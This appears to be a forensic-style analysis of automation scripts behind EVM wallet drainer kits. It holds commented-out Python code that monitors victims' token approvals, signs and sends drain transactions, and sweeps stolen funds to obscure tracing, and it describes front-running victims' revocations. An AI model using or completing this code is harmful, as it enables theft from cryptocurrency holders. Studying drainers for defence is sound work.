# EVM Drainer Kit: Automation Scripts Code Flow Analysis

**Source Document:** Comprehensive EVM Drainer Forensic Report
**Date of Analysis:** May 12, 2025

## 1. Introduction

This document details the conceptual code execution flow of **Automation Scripts** used in conjunction with EVM wallet drainer kits. The analysis is strictly based on the findings and descriptions provided in the "Comprehensive EVM Drainer Forensic Report." These scripts are typically run by the attacker on their infrastructure (often alongside or integrated with the backend server) to automate various tasks, enhancing the efficiency and speed of draining operations.

## 2. Core Objectives of Automation Scripts Code

According to the forensic report, automation scripts serve several key purposes:

1.  **Blockchain Event Monitoring:** Actively monitor the blockchain for specific events related to victim wallets or drainer contracts. This can include:
    *   Pending transactions from/to victim wallets (e.g., to front-run or sandwich, though this is more advanced).
    *   Confirmation of approval transactions submitted by victims.
    *   Incoming deposits to intermediary wallets controlled by the attacker.
2.  **Automated Draining Execution:** Trigger draining actions automatically when certain conditions are met (e.g., a new high-value approval is detected for a monitored victim wallet).
3.  **Fund Consolidation:** Automate the process of sweeping funds from multiple intermediary wallets (used to receive initial drained assets) to a central attacker-controlled wallet.
4.  **Mempool Scanning (Advanced):** Some sophisticated drainers might use scripts to scan the mempool for transactions that could be exploited (e.g., victims trying to revoke approvals, which the drainer might try to use before revocation is confirmed).
5.  **Interaction with Backend:** Receive instructions from or provide data to the main backend C2 server (e.g., notifying the backend of a new confirmed approval, receiving a list of victim wallets to monitor).

## 3. Conceptual Code Execution Flow (Python/JavaScript-centric using Web3 libraries)

The forensic report suggests these scripts are often written in Python (using Web3.py) or JavaScript (using ethers.js/Web3.js with Node.js) due to the robustness of Web3 libraries in these languages.

### 3.1. Script Initialization and Configuration

*   **Execution Step 1: Script Starts and Loads Configuration.**
    *   **Logic:** The script is executed on the attacker's server. It loads necessary configurations, such as RPC node URLs, private keys for attacker wallets (if signing transactions), target contract addresses, and lists of victim addresses to monitor (potentially fetched from the backend C2).
    *   **Code Concept (Report Implication - Python):**
        ```python
        # Conceptual Python script initialization
        # import json
        # from web3 import Web3

        # CONFIG_FILE = "config.json"
        # # config = json.load(open(CONFIG_FILE))
        # # RPC_URL = config.get("rpc_url")
        # # ATTACKER_WALLET_PK = config.get("attacker_pk") # For signing consolidation transactions
        # # VICTIM_ADDRESSES_TO_MONITOR = config.get("victim_list_api_endpoint") # Or load from a local file

        # w3 = Web3(Web3.HTTPProvider(RPC_URL))
        # # if ATTACKER_WALLET_PK:
        # #     attacker_account = w3.eth.account.from_key(ATTACKER_WALLET_PK)

        # print("Automation script started. Connected to RPC:", RPC_URL)
        ```
    *   **Functionality:** Sets up the Web3 provider, loads necessary credentials, and identifies targets for monitoring or action.
    *   **Data Flow:** Reads configuration from files or API endpoints.
    *   **Report Reference:** The "Automation Scripts" component description in the forensic report.

### 3.2. Blockchain Event Monitoring (e.g., Approval Confirmations)

*   **Execution Step 2: Start Listening for or Polling for Events.**
    *   **Logic:** The script uses Web3 library functionalities to monitor for specific on-chain events. This can be done via WebSockets for real-time event subscriptions (if the RPC node supports it) or by periodic polling of contract event logs or transaction statuses.
    *   **Code Concept (Report Implication - Python, polling for ERC20 Approval events for a specific victim):**
        ```python
        # Conceptual: Polling for ERC20 Approval events for a specific victim and spender (drainer contract)
        # ERC20_ABI_FOR_EVENTS = "[...]" # ABI including Approval event
        # DRAINER_CONTRACT_ADDRESS = "0x..."

        # def check_for_new_approvals(victim_address, token_contract_address):
        #     token_contract = w3.eth.contract(address=token_contract_address, abi=ERC20_ABI_FOR_EVENTS)
        #     # Filter for Approval events where owner is victim and spender is drainer contract
        #     event_filter = token_contract.events.Approval.create_filter(
        #         fromBlock="latest", # Or a recent block to avoid too much data
        #         argument_filters={"owner": victim_address, "spender": DRAINER_CONTRACT_ADDRESS}
        #     )
        #     new_events = event_filter.get_new_entries()
        #     for event in new_events:
        #         print(f"New approval detected: Victim {event.args.owner} approved {event.args.spender} for {event.args.value} of token {token_contract_address}")
        #         # Trigger drain logic (could be a call to backend API or direct tx from this script)
        #         # trigger_automated_drain(victim_address, token_contract_address, event.args.value)
        #     return new_events

        # # Main monitoring loop (simplified)
        # # monitored_victims_tokens = { "0xVictim1": ["0xTokenA", "0xTokenB"] }
        # # while True:
        # #     for victim, tokens in monitored_victims_tokens.items():
        # #         for token_addr in tokens:
        # #             check_for_new_approvals(victim, token_addr)
        # #     time.sleep(60) # Poll every minute
        ```
    *   **Functionality:** Identifies relevant on-chain events in near real-time or with a short delay.
    *   **Data Flow:** Reads event data from the blockchain. Triggers further actions based on detected events.
    *   **Report Reference:** The report mentions scripts monitoring for approvals to act quickly.

### 3.3. Automated Draining Execution

*   **Execution Step 3: Trigger Drain Based on Monitored Event.**
    *   **Logic:** Upon detecting a relevant event (e.g., a new, large approval to the drainer contract by a known victim), the script initiates the draining process. This might involve calling an API endpoint on the backend C2 server or, if the script has wallet capabilities, directly constructing and sending the drain transaction.
    *   **Code Concept (Report Implication - Python, direct drain if script has PK):**
        ```python
        # Conceptual: Automated drain triggered by script
        # def trigger_automated_drain(victim_address, token_address, approved_amount):
        #     print(f"Automated drain triggered for victim {victim_address}, token {token_address}, amount {approved_amount}")
        #     # This would reuse logic similar to the backend's drain_with_approval function:
        #     # 1. Get attacker's nonce: nonce = w3.eth.get_transaction_count(attacker_account.address)
        #     # 2. Build transaction to call drainer_contract.functions.drainFullErc20Balance(token_address, victim_address)
        #     #    (or similar function that takes amount if preferred)
        #     #    tx_params = { "from": attacker_account.address, "gas": ..., "gasPrice": ..., "nonce": nonce }
        #     #    drain_tx = drainer_contract.functions.drainToken(...).build_transaction(tx_params)
        #     # 3. Sign transaction: signed_tx = w3.eth.account.sign_transaction(drain_tx, private_key=ATTACKER_WALLET_PK)
        #     # 4. Send raw transaction: sent_tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
        #     # 5. Log sent_tx_hash and monitor its confirmation
        #     # print(f"Automated drain transaction sent: {sent_tx_hash.hex()}")
        #     # handle_drain_tx_monitoring(sent_tx_hash)
        #     pass # Placeholder for actual drain logic
        ```
    *   **Functionality:** Executes the necessary steps to transfer assets from the victim using the newly acquired approval.
    *   **Data Flow:** Uses victim address, token address, approved amount. Interacts with the blockchain to send transactions.
    *   **Report Reference:** Automation of draining is a key feature of efficient drainer kits.

### 3.4. Fund Consolidation (Sweeping)

*   **Execution Step 4: Periodically Sweep Funds from Intermediary Wallets.**
    *   **Logic:** Drainers often use multiple intermediary wallets to receive funds initially. Automation scripts can be used to periodically check the balances of these wallets and transfer (sweep) any accumulated assets (ETH, tokens) to a main collection wallet, often a centralized exchange deposit address or a privacy-focused wallet/mixer.
    *   **Code Concept (Report Implication - Python):**
        ```python
        # Conceptual: Sweeping ERC20 tokens from an intermediary wallet
        # INTERMEDIARY_WALLET_PK = "..." # PK for an intermediary wallet
        # INTERMEDIARY_WALLET_ADDRESS = w3.eth.account.from_key(INTERMEDIARY_WALLET_PK).address
        # FINAL_COLLECTION_WALLET = "0xAttackerMainWallet"

        # def sweep_erc20_from_intermediary(token_address):
        #     # erc20_contract = w3.eth.contract(address=token_address, abi=ERC20_ABI_MINIMAL)
        #     # balance = erc20_contract.functions.balanceOf(INTERMEDIARY_WALLET_ADDRESS).call()
        #     # if balance > 0:
        #     #     print(f"Sweeping {balance} of token {token_address} from {INTERMEDIARY_WALLET_ADDRESS}")
        #     #     nonce = w3.eth.get_transaction_count(INTERMEDIARY_WALLET_ADDRESS)
        #     #     tx_params = { "from": INTERMEDIARY_WALLET_ADDRESS, "gas": ..., "gasPrice": ..., "nonce": nonce }
        #     #     transfer_tx = erc20_contract.functions.transfer(FINAL_COLLECTION_WALLET, balance).build_transaction(tx_params)
        #     #     signed_tx = w3.eth.account.sign_transaction(transfer_tx, private_key=INTERMEDIARY_WALLET_PK)
        #     #     sent_tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
        #     #     print(f"Sweep transaction sent: {sent_tx_hash.hex()}")
        #     pass # Placeholder

        # # Main sweep loop (simplified)
        # # SWEEPABLE_TOKENS = ["0xTokenA", "0xTokenB"]
        # # while True:
        # #     for token_addr in SWEEPABLE_TOKENS:
        # #         sweep_erc20_from_intermediary(token_addr)
        # #     # Sweep ETH as well
        # #     # sweep_eth_from_intermediary()
        # #     time.sleep(3600) # Sweep every hour
        ```
    *   **Functionality:** Automates the movement of funds to consolidate attacker profits and make tracing harder.
    *   **Data Flow:** Reads balances from intermediary wallets, sends transfer transactions to the main collection wallet.
    *   **Report Reference:** Fund laundering mechanisms section of the report implies such consolidation steps.

### 3.5. Mempool Scanning (Advanced)

*   **Logic:** The report hints at advanced techniques. Scripts could connect to RPC nodes that offer mempool access (e.g., via `pendingTransactions` subscription or specific mempool APIs) to look for transactions that might be interesting, such as a victim trying to revoke an approval. The script might then try to use the approval with a higher gas fee to front-run the revocation.
*   **Code Concept:** This is highly complex and RPC-dependent. It would involve decoding pending transaction data, identifying relevant calls (e.g., to `approve` with amount 0), and quickly submitting a competing transaction.
*   **Report Reference:** Mentioned as a sophisticated capability in the context of Red Team analysis.

## 4. Conclusion

Automation Scripts are a force multiplier for EVM wallet drainer operations. Their code execution flow centers around proactive blockchain monitoring and reactive, automated transaction submission. By automating tasks like approval detection, drain execution, and fund consolidation, these scripts allow attackers to operate at scale, respond faster to victim actions, and manage their illicit proceeds more efficiently. The complexity of these scripts can vary significantly, from simple polling loops to sophisticated mempool-aware bots, as indicated by the forensic report.

